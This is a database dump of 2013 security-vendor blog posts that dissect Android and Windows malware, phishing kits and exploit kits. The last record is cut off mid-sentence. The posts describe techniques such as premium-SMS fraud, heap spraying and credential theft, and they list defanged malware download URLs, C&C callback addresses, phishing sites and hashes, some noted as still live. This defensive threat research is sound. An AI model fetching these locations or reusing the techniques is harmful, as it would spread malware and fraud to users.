INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (212, 'Dissection Of Android Malware MouaBad.P', 'Viral Gandhi', 'December 16, 2013', 'In Zscaler’s daily scanning for mobile malware, we came across a sample of Android Mouabad.p. Lets see what is inside.         Application static info:     Package name = com.android.service    Version name = 1.00.11    SDK   version: 7    Size: 40 kb         Permissions:           	android.permission.INTERNET  	android.permission.ACCESS_NETWORK_STATE  	android.permission.READ_PHONE_STATE  	android.permission.SET_WALLPAPER  	android.permission.WRITE_EXTERNAL_STORAGE  	android.permission.MOUNT_UNMOUNT_FILESYSTEMS  	android.permission.RECEIVE_SMS  	android.permission.SEND_SMS  	android.permission.RECEIVE_WAP_PUSH  	android.permission.READ_PHONE_STATE  	android.permission.WRITE_APN_SETTINGS  	android.permission.RECEIVE_BOOT_COMPLETED  	android.permission.WAKE_LOCK  	android.permission.DEVICE_POWER  	android.permission.SEND_SMS  	 android.permission.WRITE_APN_SETTINGS  	 android.permission.CHANGE_NETWORK_STATE  	 android.permission.READ_SMS  	 android.permission.READ_CONTACTS  	 android.permission.WRITE_CONTACTS  	 android.permission.CALL_PHONE  	 android.permission.INTERNE  	 android.permission.MODIFY_PHONE_STATE                                                                                                                      Used features:           	android.hardware.telephony  	android.hardware.touchscreen             Services:           	com.android.service.MessagingService  	com.android.service.ListenService             Receivers:           	 com.android.receiver.PlugScreenRecevier  	 com.android.receiver.PlugLockRecevier  	 com.android.receiver.BootReceiver  	com.android.receiver.ScreenReceiver                       Virustotal scan:    https://www.virustotal.com/en/file/1b47265eab3752a7d64a64f570e166a2114e41f559fa468547e6fa917cf64256/analysis/         Now Lets dissect the code.        This application is using telephony services as shown in the code as well as in static analysis. You can see the use of premium telephone numbers.        In this particular screenshot, you can see functions which are using phone services for making calls to the premium numbers in order to generate revenue as the numbers would be controlled by the attackers and earn a small payment for each call made.        Here you can see that the application is harvesting SIM card information.            This application also checks for mobile data and the WIFI network status to determine if Internet connectivity is available.      The code includes a hardcoded list of premium telephone numbers, which are all located in China.                               In this screenshot you can clearly see that application also keeps watch on the screen and keyguard status (on/off).    This screenshot clearly denotes that the application tries to send SMS to the premium rate numbers previously seen in the code. Forcing Android applications to initiate calls to premium phone numbers controlled by the attackers is a common revenue generation scheme that we see, particularly in Android application distributed in third party Android app stores.        Here you can see various function names which are suspicious such as call, dial, disableDataConnectivity, get call location, etc. These functions suggest that the application is also trying to keep watch on other phone calls too. Function getCallstate, endCall, Call, CancleMissedCallNotification Illustrates that the application tries to control phone call services.    The application installs itself silently. Once installed, no icon is observed for this app. Also shown in the previous screenshot is the fact that the application waits for the screen and keyguard events before triggering its malicious activity. It does all of the activity without user intervention. This allows the malware to function without a suspicious icon on the home screen that just one of  technique used by malware authors to evade its presence to the device owner.            From above screenshots, you can see that the application is using the XML listener service.  Also, in the second screenshot, you can see that the application is trying to create a URL by assembling various strings. This is likely command and control (C&C) communication sent to a master server. The parameter &imei denotes the harvesting of the phone\'s IMEI number for tracking the device.    In conclusion, this malware will defraud the victim by silently forcing the phone to initiate premium rate SMS billing to generate revenue. The application may give control to the author for monitoring or controlling phone calls.  Reference:    https://blog.lookout.com/mouabadp-pocket-dialing-for-profit/', 'Uncategorised', 'https://www.zscaler.com/blogs/research/dissection-android-malware-mouabadp');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (213, 'Dissection Of Zertsecurity - Banking Trojan.', 'Viral Gandhi', 'December 16, 2013', 'Zertsecurity is a well known banking Trojan based on phishing schemes targeting German Android users.  Lets see how it works.\r\n\r\n\r\n\r\nAfter installing the application, it prompts the user for account and PIN numbers.\r\n\r\n\r\n\r\nThe application takes the values of the account and PIN numbers via input boxes and saves them to the cfg.txt file. It then sends this file to a remote command and control (C&C) server master.\r\n\r\n\r\n\r\nYou can see the hardcoded C&C server in the application.\r\n\r\n\r\n\r\nAlso here you can see that the application is also asking for SMS receive permissions. It receives SMS messages from it\'s C&C server for commands to perform malicious activities. It also checks for the string “&Sign28tepXXX” in order to identify commands from the C&C server.\r\n\r\n\r\n\r\nHere you can see that the application is using AES and BASE64 encoding techniques for encryption.\r\n\r\n\r\n\r\nIn this screenshot you can see the C&C messages being assembled.\r\n\r\n \r\n\r\nZertsecurity is a simple banking Trojan which was constructed for targeting phishing attacks against German Android users. It prompts for an account number and PIN, stores them in the cfg.txt file after encrypting the information using AES and base64 encoding algorithms. It also receives SMS from a hard coded C&C server for additional instructions.\r\n\r\nReferences:\r\n\r\n \r\n\r\nhttps://blog.lookout.com/zertsecurity/\r\n\r\nhttp://www.symantec.com/security_response/writeup.jsp?docid=2013-050820-4100-99', 'Uncategorised', 'https://www.zscaler.com/blogs/research/dissection-zertsecurity-banking-trojan');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (214, 'Bitcoin Mining Operation Seen Across Numerous Malware Families', 'Chris Mannon', 'December 13, 2013', 'The talent over at Malwarebytes broke a story this week regarding Fake Flash Player phishing attempts dropping malicious content onto victim machines for the purpose of mining Bitcoins.  The threat tricks users into thinking that they are downloading a new version of Flash Player.  In actuality, the threat drops a few malicious executables (stored in \"[username]/AppData/Roaming/Data\"), called Control.exe and svchost.exe.  Once the threat is up and running, it communicates over a specific port for the purposes of mining Bitcoins.     I did some digging of my own to see if there are other such instances of phishing attacks made by this threat.  I found a variant as described in MalwareBytes blog based on the dropped files and the string \".pw/blam/flashplayerv\".  The end result was an additional 21 files which display similar network traffic patterns as those mentioned in the companion blog.       	hXXp://testcomplex.ru/start.rar  	  		cec21efea72ab723b941f2f6567decb0  	  	  	hXXp://testcomplex.ru/start.rar  	  		21e5053a2441c677a880e4cb7d255a99  	  	  	hXXp://testcomplex.ru/start.rar  	  		65f9d11688b4d646f88613fd7992deb1  	  	  	hXXp://testcomplex.ru/install.exe  	  		2b6cee719a8bde00f6424e0cfe7084fe  	  	  	hXXp://37.49.225.116/min.gif  	  		602562a016dff28ed79516a8bf0071e6  	  	  	hXXp://apl.wipmania.com.stcus.ru/icon/n.gif  	  		963b3ca4b99ced69c066708db9ca9808  	  	  	hXXp://apl.wipmania.com.stcus.ru/icon/n.gif  	  		13239a42bf5926d17f0326e04b97305b  	  	  	hXXp://37.49.224.190/minfd.gif  	  		ac9edf2d203dd0f5a6ec22aee27a979b  	  	  	hXXp://37.49.224.190/min.gif  	  		7d45967be467500b7706bb47e9afd6ff  	  	  	hXXp://37.49.224.190/mymin.gif  	  		ff06cfd19e20d06a9526aaf5d3487241  	  	  	hXXp://v.wipmsc.ru/7.gif  	  		5a6faa287c00393d244915763474c811  	  	  	hXXp://apl.wipmania.com.stcus.ru/icon/n.gif  	  		6b6690501d7891b236ef7e1af2757e2b   	  	  	hXXp://194.63.143.179/winupd.exe  	  		0cf3fbe8e52fa8099cd0cd99595aeca2  	  	  	hXXp://afox-news.pw/blam/flashplayerv10.1.57.108.exe  	  		804818386fdde1b2cec4098bad418bb3  	  	  	hXXp://api9.wipmania.com.wipmsc.ru/api9.gif  	  		e844b610e15539d9dd6d606da80b4d31  	  	  	hXXp://api9.wipmania.com.wipmsc.ru/api9.gif  	  		a0da986eee6ad3445d754fef995efb15  	  	  	hXXp://api9.wipmania.com.wipmsc.ru/api9.gif  	  		6a03090918481714cfae77a136248fe3  	  	  	hXXp://api9.wipmania.com.wipmsc.ru/api9.gif  	  		c49747b9aaaf031e27af8a158463890e  	  	  	hXXp://www.darxk.com/aviatic/systema.exe  	  		b059d1dac00875710f857636e06353d0  	  	  	hXXp://api9.wipmania.com.wipmsc.ru/api9.gif  	  		a8a900bed39d5443ac6cf479b2c70a07  	  	  	hXXp://www.marc-weding.de/images/banners/sysmonitor.exe  	  		400e5bb67427939b3d2815f611a52ffc  	  	  	hXXp://www.darxk.com/aviatic/systema.exe  	  		c30edf9d605627c9f55b8d4062471115  	  	    The network patterns which I\'m matching on is any executable which makes a connection to  178[.]33[.]111[.]19 on port 9000.  I gathered packet captures for many of these threats phoning home in this way.  The results were overwhelming identical as seen below:         The conclusion we can reach is that Bitcoin mining is proving to have reached a point where it is profitable enough to be on the radar for scammers.  Administrators should take note of the traffic patterns mentioned here and monitor for similar transactions.  It should also be stated that the above list contains some still active download locations for this threat, and that the VT results can be confusing.  All of the MD5s mentioned above are detected across the board as different threats ranging from InfoStealers to Backdoor trojan droppers.  This shows that regardless of the initial focus of the malicious executable, bitcoin mining is still a profitable enough for scammers to bundle into their ill-gotten gains.', 'Malware', 'https://www.zscaler.com/blogs/research/bitcoin-mining-operation-seen-across-numerous-malware-families');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (215, 'Google Docs Scam Stealing Passwords', 'Chris Mannon', 'December 05, 2013', 'Scammers are up to mischief again by tricking users into clicking false webmail widgets.  The core goal of any phishing attempt is to compromise the victim\'s access to a particular service.  Usually this is done by posing as the service the attacker wants to hijack from the victim, and sending the username and password information back to the attacker.  I\'ve seen plenty phishing schemes in the past but what follows is the most blatant attempt at tricking users I\'ve ever seen.  Get ready...\r\n \r\n\r\n\r\n\r\n\r\nNothing says legitimacy like what must have been Adobe Reader\'s Myspace page layout from 2004.  Among the URL mentioned in the pic, other instances were seen as well to be related.\r\n\r\n \r\n\r\n \r\n\r\n\r\n	hxxp://hasanalkhalaf.com/goglefiles-docs/2013gdocs/index.htm\r\n	hxxp://bikecenteraracati.com.br/site/images/stories/ngdocs/login.html\r\n	hxxp://4mtrust.org/2013gdocs/login.htm\r\n	hxxp://kidneywisestp.org/kas_file/gdocs/\r\n	hxxp://shareddocumentation.escuelajuanadeasbaje.edu.mx/\r\n	hxxp://www.regnodellegno.it/tmp/sfile/googledocs/index.html\r\n	hxxp://www.sgp.geodezja.org.pl/warszawa/images/stories/r/doc/file.index.htm\r\n	hxxp://maso2.cl/wp-n/index.htm\r\n	hxxp://www.chuchuguazastyle.com/lord/vhyvyvvyvyvy/\r\n	hxxp://atcproject.ru/plugins/user/2013/2013googledocs/index.htm\r\n	hxxp://www.myhawkslanding.com/site/plugins/doc/file.index.htm\r\n	hxxp://ideid.in/olaat/gdocs/\r\n	hxxp://casasnogeres.com/googledocs/googledrive/google/index.htm\r\n	hxxp://cr-magazin.ch/cach/googledocss/googledocss/sss/\r\n	hxxp://www.studiobanel.com/en/wp-admin/googledocfileap/\r\n	hxxp://www.colerainezomba.org.uk/phpthumb/gdocs/index.htm\r\n	hxxp://www.atlasfernsehdienst.de/joomla/delonghi-kundendienst-muenchen.de/components/com_user/ngdocs/login.html\r\n\r\n\r\nIf you happened to click through one of these links to \"Log In\" with your username and password, this is what you didn\'t seen in the background.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Whoops\r\n		\r\n	\r\n\r\n\r\nAfterwards, the victim will find that whatever option they chose will land them at Google\'s HomePage.  In the tested instance seen above, it was observed that the attacking site was hosted in India.\r\n\r\nMind your Clicks.', 'Phishing', 'https://www.zscaler.com/blogs/research/google-docs-scam-stealing-passwords');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (216, 'Sharik Back For More After Php.Net Compromise', 'Chris Mannon', 'November 27, 2013', 'Sharik is a Trojan which injects itself into legitimate processes and adds registry entries for an added level of persistence.  The infection also sends information about the victim\'s PC to a remote server.  The threat can also receive commands from a known CnC server to download further malicious files.  The point of origin in this case is almost always a compromised website as discussed previously in a colleague\'s blog.  At the time of research, I had not pinpointed the initial infection for this threat.  The end result of the Trojan infection appears to be identical to past iterations of this threat.    The following are known drop points for this threat:    	hxxp://69.64.70.25/301940a6b4673c67bd421220bb092fdc/justice-corresponding.php?zf=322d305457%26Be=2g55562e312f2j2j3155%26N=2d%26WT=L%26pP=i  	hxxp://corp-firewall.com/6.exe  	hxxp://66.11.227.108/0c3dcf60e6a7a6d2821831740af2cd59/optimum-bi.php?Jf=7172407038%26Ve=3b707139413a3e3e4170%26u=38%26sE=R%26q%29=w  	hxxp://main-firewalls.com/6.exe  	hxxp://main-firewalls.com/6.exe?  	hxxp://lessnvanor.info/calculator.exe  	hxxp://173.201.34.30/fabba93c6d389652ec249d95d79b9a43/connecticut-session.php?m7d%29-7-7g=8ew68aw68d%26-%21009GrVe=w88c8dw6wdw7wbwbwd8c%26h__%28D5V%2A_VI=ww%266U1P%2AJ0C9O%2A_V%21B=aGP%2Al%21FY%2A1_81%21C%26C8%21-N6%2AN=8y%2A%2AJk_%288XR_  	hxxp://216.224.186.70/setup.exe  	hxxp://61.152.158.37/da4fc29e32968439fd700e495d4e8903/instructors-spectrum.php?110b00aab11a001bba=-h-z76-b-e%260ba1a111a0b=-b7677-9-g-z-e-e-g76%26a0bab000ab01=-y%260bba0b01b1a00b1a=100a1a0100b110%26ba00aab0101ab1=11aab0b1bb10  	hxxp://193.106.172.140/index.php    Many of these files have already been talked about in other blogs, especially for the the corp-firewall.com and main-firewalls.com drop sites.  What helped me tie all of these infectious files together was their distinct phone home traffic.  Every instance mentioned above displays the same phone home behavior albeit to different locations.  Below is the phone home activity displayed by all of the above trojans:       	hxxp://174.70.149.96:35618/5239438/u491236/index.php  	hxxp://50.88.254.49:35618/ci5Xud?feVStUWVtcBMjoAOg=qLPueIKdPtnm&KNXWYseFaHCidA  	hxxp://80.15.218.122:35618/8DVQ6mm?xKKolchGvVMvI=SfipwkaWliPWrc  	hxxp://50.88.254.49:35618/OGbJfx1ro?yXvViVNepTrkRlNJ=AwqRMHHpLqJXAD&qagYnRxnYQYSpIEcB=lFAIbxdmjHO&eFTsEVSmSYpCtMbdm  	hxxp://68.102.186.119:35618/618342/d4921412/index.php  	hxxp://50.88.254.49:35618/UkMlaX?FpvxpKdwTaBxKVBD=kkEAvywTFQIBomL&BDKBeMIRwgNa  	hxxp://50.88.254.49:35618/KrU1qi1nu?SmjxtvpdphspkM=mxBoWXdFowVQLbm&PwkjWlqBMyBEf=qqePnpwIekn&YddGxrkSWPJgfe  	hxxp://68.102.186.119:35618/618342/d4921412/index.php  	hxxp://68.102.186.119:35618/jTORvR4mk?UkJmcNFNATO=NNpFbHCwxSRrRAHc&kIhIDgpeUOl=ILTtrQjWgYYOfAgJk  	hxxp://78.167.119.210:35618/3W7a8ph?AMhxEPvNUERWTHOK=oykAeQgptMTkJ&YxYLAodNKB  	hxxp://87.160.74.191:35618/suFTmE?FjRJTTyREjklwuELn=fSqlGVwMPjOin&bfGborcmWbla  	hxxp://96.58.105.16:35618/3Pkppd?osWurwLDMTivWmgac=xvxKVqTCeXfNBDuqe&YVkeMBlqIHTwg=rnTHuVwBKUMfjDVi&KOdCbidxJEVB  	hxxp://68.102.186.119:35618/cuw8y2?kwLQWFDmiQVKYmo=roVUdIwlxngKeJ&ilPweGjCVPFi  	hxxp://70.90.19.69:35618/618342/g1048234/index.php  	hxxp://109.29.222.118:35618/7x9pkn?KOwQrSdXnqXdAgJAA=FnHRwvBPgcIXuDA&rkWmaTRhJcWGAXtF=rnwXgTDkUrVXmfJdi  	hxxp://107.213.251.143:35618/618342/h491274/index.php  	hxxp://96.244.246.64:35618/493247/i423479/index.php  	hxxp://74.71.202.23:35618/493247/i423479/index.php  	hxxp://67.87.103.199:35618/493247/i423479/index.php  	hxxp://69.92.46.228:35618/tY0pcd?soRLbxjFdVCeo=YjcGWaFpmwdyG  	hxxp://68.118.249.206:35618/4Jdbqg5xi?UPrmDhcakwJtH=uHicfgSQWPsLJVa&uqHNsOpuWIEUKSQf=wqQOkoPieCTVsj&EuYAbtgNJHxoj=fYFukcVftXpEWOL  	hxxp://69.92.46.228:35618/O2Wgky1ex?sKhnFBxHVOsAg=ArsWCCCVkgevlo  	hxxp://64.251.129.122:35618/IFmZnn?LhnRHjJjcBP=YhfseyodnwkJi&NkAEOSEPXxUvwFan=orpPSnPiuFDuk&NeIxkIOJpWkH  	hxxp://24.237.39.65:35618/5923/u82364286/index.php  	hxxp://69.92.46.228:35618/SHPdiz?EApYkqAbAlYxWkG=jvBlaYDMbla  	hxxp://24.151.47.183:35618/i2dBru5br?WOvpdgXBvbjRAI=lghnceNceN&vIBagHuAExoRd=eCYwmudMPJoyXsaj&RouLOdQJEXYJEJ  	hxxp://69.92.46.228:35618/OKlHrt?wpOcUyyXtpGXCdFj=RJOWxyDOepMWDG&cDAbmAKpjg  	hxxp://78.112.119.85:35618/5923/j41824612/index.php  	hxxp://76.100.9.18:35618/PUU06dl?mUlCxcKquOICm=rMOvgjltEicp  	hxxp://72.218.201.207:35618/nfCdkN?tOKAOFdkuIre=slKVYfIUkDpnM&OqnMeKxfwdyCQJ=wUGxeQRcvtDMwIoj&NpyeBDYjrurEkfc=sWJWvGdFTOkRAD  	hxxp://173.30.185.44:35618/s6fjdU?UgFIrOJJWsjmQo=HmgyBypGXbTwHKL&UHqwbRQgtNcnCfsO=amBRUJFjWSdqagRyj  	hxxp://68.82.210.42:35618/Igchv87fj?uNytyqkbJTVXEaBLH=aGnHwxpDNVcUReQf&uxLwEfRGPLBm=CmNinWfybrpgRj&EoOhaxhdbID=dSdbmpJOAj  	hxxp://68.82.210.42:35618/FJEE7rn?qiXtdIHxpFmGE=KsmiFMHufteqwVd&dVOoTpCMVBDQm  	hxxp://72.82.61.239:35618/36414/g977123/index.php  	hxxp://173.30.185.44:35618/AHA24?VwweLQojXjqRbIi=KQIGDkFqLvGD&MVhIYJPKADM=fCeuCMPJGsmH&KBFYwYDElgmTTtHxe  	hxxp://81.139.129.74:35618/36414/j481261/index.php  	hxxp://98.254.127.113:35618/30468/83427g/index.php  	hxxp://222.254.155.130:35618/30468/83427g/index.php      The transaction I\'ll be focusing on here is the very last bullet point.  After the infection occurs on the victim\'s PC, it creates an autostarter that hooks into explorer.exe to add a level of resilience to hinder standard AV removal methods.  At the time of research, the MD5 (fa33c07e27e4a1e9f1ecdf1172f12562) was being detected by 8/46 AV engines on Virustotal.               The main function of Sharik is to leave the victim open to further infection.  To do this, the infection will set up a backdoor and communicate with it\'s CnC.  The attacker can choose to attack the victim further later on.  The standard communication between the victim and attacker appears to take place on a non-standard port 35618.  Given the high volume of variants of this threat, it is advised to close this port or at least monitor it for suspicious activity.                                It should also be noted that many of the above mentioned download locations are involved in other threats.  For example, main-firewalls[.]com is very closely related to Nymaim ransomware.  Another example is the md5, 771cc060cf15fc29290a0109c1cf7669, which is a Fareit variant.  So what is a ransomware application and a FTP stealing trojan doing displaying the same phone home activity as a resilient backdoor Trojan?  This activity hasn\'t been tied to on specific group at the time of research, but administrators and users should be on notice.  Where there is smoke there will inevitably be fire.  So if you suspect you or the users you are responsible for are seeing HTTP traffic like the above mentioned, then it definitely merits further investigation. Mind your clicks.', 'Compromise', 'https://www.zscaler.com/blogs/research/sharik-back-more-after-phpnet-compromise');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (217, 'CVE-2012-1889 Is Still Alive!', 'Viral Gandhi', 'November 07, 2013', 'In  Zscaler’s dailyscanning, we identified an instance where CVE-2012-1889 (MSXML Uninitialized Memory Corruption Vulnerability) is still alive. Lets take a look.           The site hxxp://wm.17wan.info:9999/zx/zip.html?mag.fznews.com.cn is a Chinese site, which targets online gamers by serving malicious code which exploits Microsoft XML Core Services. This attack allows  a remote attacker to execute arbitrary code or cause a denial of service (memory corruption) via a crafted web site. The site serves highly obfuscated code to evade antivirus solutions.     VirusTotal lookup    https://www.virustotal.com/en/file/3eaf208c67ec268b969f260f55ef7d70fd06f3b086a6dcc9fdfb57758dd62240/analysis/1380076165/  You can see the highly obfuscated code served by the malicious site in the screen shot below.                The highlighted code shows that the a CLSID object is being used, which is exploited by parsing long strings of the letter “A”. This CLSID object is related to the vulnerability detailed in CVE-2012-1889.    Lets take a look at a beautified version of this code.             This highlighted section shows the suspicious function, which leverages the shell code for exploiting the vulnerability.             Here function heapLib() performs a heap spray. You can see the complete series of functions utilized in the full attack.    Let\'s decode the script which is shown in first screen shot                                               The decrypted source code shows that random named parameters are used for obfuscation of the original code. The chunks of code are combined into a final code snippet, which is then decoded again for making the actual shell code. Here you can see that the variable “t” is using the “MYKEY” parameter and “MYKEY” is using the “MY” parameter to construct the final chunk. This final chunk is again decoded by the function utf8to6() and nbcode(), which are defined in the source code for the final payload and that is used by the window object. At the end of the code the “t” variable generates the final javascript snippet which executes the shellcode.                       This is the javascript which is generated at variable “t”.  Again, this script is obfuscated. Obfuscation is primarily used by malware authors to avoid antivirus detection. It should be noted that malware authors do not always leverage 0-days, in fact most technical attacks utilize known vulnerabilities as attackers know that a large percentage of PC users have not applied the latest patches.                An interesting observation is that the javascript is written in such a way that it only works on IE. It avoids delivering an unnecessary heap spray when loaded in another browser. That’s why when you open this site with IE it crashes IE and while opening with any other browser it works fine. It does however attempt to serve alternate malicious files to other browser users such as the samples described below.              Here you can see the sourcode contains a link which drops a malicious Rar file.                  VirusTotal lookup             https://www.virustotal.com/en/file/b732b09a6cacd78a8c6a789e8ee17b8c741de2c0234886decf6ce1807808c305/analysis/                 HTTP Transactions              This site makes a connection with following sites      	  Js.users.51.la   	 Web1.51.la:82      Zscaler provides complete protection for these threats.', 'Exploit', 'https://www.zscaler.com/blogs/research/cve-2012-1889-still-alive');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (218, 'NHIC Spam Harvesting Victim\'s Information', 'Chris Mannon', 'October 30, 2013', 'Scammers and spammers are known to capitalize on user\'s news hungry interests.  In the past year, they\'ve tricked users into clicking on malicious links in e-mails, blog comments and social media posts on anything from the Royal Baby to the U.S Government shutdown.  The end result of these attacks varies from scam to scam, but the tactic remains the same.  Provide just enough intrigue and official looking graphics or text to peak the user\'s curiosity and take advantage of less savvy users.  This time they seem focused on exploiting victim\'s interest in health care plans offered by the National health Information Center (NHIC), a US government run health information referral service.\r\n\r\n \r\n\r\n\r\n	\r\n		\r\n			\r\n		\r\n		\r\n			Stock image which leads to a false enrollment form\r\n		\r\n	\r\n\r\n\r\n\r\nThis e-mail has been through circulation for awhile now and shows no signs of letting up.  This usually marks the success of a spam campaign.  Victims will be disappointed to find that they are not actually signing up for preventive health treatment, but are actually signing themselves up to be victims of Personally Identifiable Information (PII) theft. Clicking through to this link will actually execute an obfuscated JavaScript snippet which will lead the user to a contact information request form.\r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n\r\nLess savvy users may think this is part of the process to apply to the NHIC, but this is actually an elaborate fraud to convince users to willingly provide their PII so that it can be sold or used in further attacks later on.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\n\r\n\r\n\r\nUser\'s should take extra care when it comes to handling their e-mail attachments and links.  No matter how official a site looks, there should always be a degree of caution when handing out your PII over the internet.', 'Social Engineering', 'https://www.zscaler.com/blogs/research/nhic-spam-harvesting-victims-information');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (219, 'Nuclear Exploit Pack Getting More Aggresive', 'ThreatLabz', 'October 29, 2013', 'Churning through our logs, we recently observed a significant rise in the number of transactions involving the Nuclear Exploit Pack, which has been in the news for quite some time now. In the past week, we stumbled upon thousands of transactions involving the Nuclear Exploit Pack infestation.    We could see the whole exploit chain in our logs and the exploit kit was hosted mainly originating from the following IPs:    198[.]50[.]235[.]204  198[.]50[.]235[.]203  198[.]50[.]235[.]174  198[.]50[.]235[.]152  198[.]50[.]235[.]36    Whois information on this net block range shows that these IPs are hosted in Russia (no surprises here!).        A few transactions were also found at the IP: 158[.]255[.]6[.]117 (this may be related to a campaign posted by @malwaremustdie).    Some sample referral URLs, which lead to the exploit kit are shown below:     fouce[.]paroyourjob[.]info  bluesevs[.]likedating[.]info  datzone[.]onlinesdating[.]info  www[.]jornaiserevistas[.]com  www[.]noticiasaominuto[.]com  www[.]johnjones1[.]com  goodzdatin[.]work4wheelsa[.]info  www[.]tyleroralsurgery[.]com  kempmeek[.]com    Upon examining one of these infected sites, a typical Nuclear Exploit pack pattern was observed. A series of 304/302 redirects that finally leads to the exploit kit landing page as shown below.                   The landing page contained an obfuscated JavaScript payload that was deobfuscated to get the original JavaScript plugin detection and applet/pdf injection code. It was similar to what we typically see from the. Blackhole Exploit Kit.      The applet is used to make a call to the malicious jar file which uses CVE-2013-2460, as shown here. The following screenshot, shows the JAR file exploiting the vulnerability. The JAR file then downloads and invokes the malicious executable. a recent VT report shows a poor detection ratio for the JAR file.                    We managed to collect 19 malware samples that were dropped by this exploit kit. Most of them were Spyeye/Zbot drops, Ransomware, W32.Caphaw, Injection Trojan, Proxy Trojan, Keylogger, Spam Bot etc. The following reports detail the malware found:    https://www.virustotal.com/en/file/36eec2b80586211f14bd7f9af3dc68afec629fc9f3071933e959570ac58d87be/analysis/1382745996/  https://www.virustotal.com/en/file/beb0f5929f886a505b31a98f6ae9b4b02bb303088f1c8ecd74ef6516189e4248/analysis/1382746009/  https://www.virustotal.com/en/file/45b3e40cb392489251dec6b24f575c4281570f427b83a6d4d983c86ace35fc7e/analysis/1382746036/  https://www.virustotal.com/en/file/4b708d1ee0d0bac61825ed9ede005978a5610d60fce27b69c2b862fd65e2c07e/analysis/1382746051/  https://www.virustotal.com/en/file/f2219983385daa9d1fadb144088f84d154775dca3002f82e855897f7e8b40d04/analysis/1382746068/  https://www.virustotal.com/en/file/2bb3bc2ebf299d853ddff54c142849882dfa6fc9fa32620cf2ddd01507606e8e/analysis/1382746101/  https://www.virustotal.com/en/file/0d7feaa9595c23828b1d1e7ca898da9a694b151b0a8c87350e001e8f8b7e3fb8/analysis/1382746122/  https://www.virustotal.com/en/file/42d8cb1b05b6d9ed5adabfb2f3184738378b4bbf72b39139bab37de764e99b4a/analysis/1382746135/  https://www.virustotal.com/en/file/d671fd25f75323d74621c6c9e520dd84f64b2ed2588a58838e65283e9067b8c9/analysis/1382746303/  https://www.virustotal.com/en/file/fecdc7eb44508a80e548955945737e2739ec2a6f9f8c4c05d35869a73f82ec2c/analysis/1382746155/  https://www.virustotal.com/en/file/288fae8c7a7f34e36e1ace80fd73392cffc83e53dfdb1961252296692499463e/analysis/1382746167/  https://www.virustotal.com/en/file/b94e93b4b25b1ff7d0dbc8aa3f6c5af80ee0afc4005eddb52d364a59ab8e308a/analysis/1382746305/  https://www.virustotal.com/en/file/8b543c1cce54aec0b6c4b85102bb2a5ffa7f10e69dab19a8812d7b069e84ee5d/analysis/1382746188/  https://www.virustotal.com/en/file/5f84ab5ac0548d2257084e6542d7fd5678bf3f8175f0b8c6e9098a3187f7e4bb/analysis/1382746200/  https://www.virustotal.com/en/file/cbb32fba48f0029b1e6191130b0e68fe44c8364303badd8fc485a1c4d7bf4fc7/analysis/1382746211/  https://www.virustotal.com/en/file/233d56bd1d40608c6302760b4920a4b9daf60df7e32f23fd9f5210603dcb313a/analysis/  https://www.virustotal.com/en/file/2d7df365e65a9415611411aa44c8ed6d7439bfa3c2dfbf21afaff3fd520a79e3/analysis/1382746237/  https://www.virustotal.com/en/file/02e440ccb37a82b3fea48c03849af40ed9110069b555b50f3fa79945dd7caa08/analysis/1382746252/  https://www.virustotal.com/en/file/93167da47833a257ac2d231e10d0b8f8d1f33c4727521fb5bcf6a189522f3e0f/analysis/1382746259/    Java, software that runs on over one billion devices and is even used to authorize/authenticate tokens in banking applications, continues to be exploited. The Nuclear Pack follows this same pattern, as the authors have taken a recent Java CVE and crafted it into the exploit kit. It is always advisable to disable java on your computer to prevent falling victim to an attack that leads to credential leakage, information theft and becoming a bot. Stay safe and happy Browsing!', 'Exploit Kit', 'https://www.zscaler.com/blogs/research/nuclear-exploit-pack-getting-more-aggresive');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (220, 'A New Wave Of WIN32/CAPHAW Attacks - A ThreatLabZ Analysis', 'Chris Mannon', 'September 18, 2013', 'Introduction and setting the context    Over the last month, the ThreatLabZ researchers have been actively monitoring a recent uptick in the numbers of Win32/Caphaw (henceforward known as Caphaw) infections that have been actively targeting users\' bank accounts since 2011.  You may recognize this threat from research done by WeLiveSecurity earlier this year in regards to this threat targeting EU Banking sites.  This time would appear to be no different.  So far, we have tied this threat to monitoring it\'s victims for login credentials to 24 financial institutions.    About Win32/Caphaw     The Caphaw trojan is a financial malware attack that functions similarly to the Carberp, Ranbyus, and Tinba threats according to analysis done by WeLiveSecurity Researcher, Alekandr Matrosov. These attacks are carried out utilizing stealth tactics both on and off the wire.  Caphaw avoids local detection by injecting itself into legitimate processes such as explorer.exe or iexplore.exe, while simultaneously obfuscating its phone home traffic through the use of Domain Generated Algorithm created addresses using Self Signed SSL certificates.  This limits the ability of traditional network monitoring solution to dissect the packets on the wire for any malicious transactions.  Caphaw attacks major European banks and previous analysis has shown that the malware is most active in the UK, Italy, Denmark and Turkey. This is especially prevalent considering the mapped known infected nodes seen here.     The geoip (location) information derived from the infected host is of special significance to this malware. The malware leverages the following legitimate URL: hxxp://j.maxmind.com/app/geoip.js to discover geoip information about its freshly infected victim.  Administrators should view this transaction as a starting point for their investigation into any suspicious activity. It is not a malicious service, but illustrates how malware writers can leverage even legitimate services. The infection uses the output of this script to extract location information about the infected host/victim.         At the time of research, we were unable to identify the initial infection vector.  We can tell that it is more than likely arriving as part of an Exploit Kit honing in on vulnerable versions of Java.  The reason we suspect this is that the User-Agent for every single transaction that has come through our Behavioral Analysis (BA) solution has been: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_07.           	  		  			  		  		  			The UserAgent for known drop locations of this are manipulating users with Java version 1.6.07  		  	      The variation in the dropped executable is different across 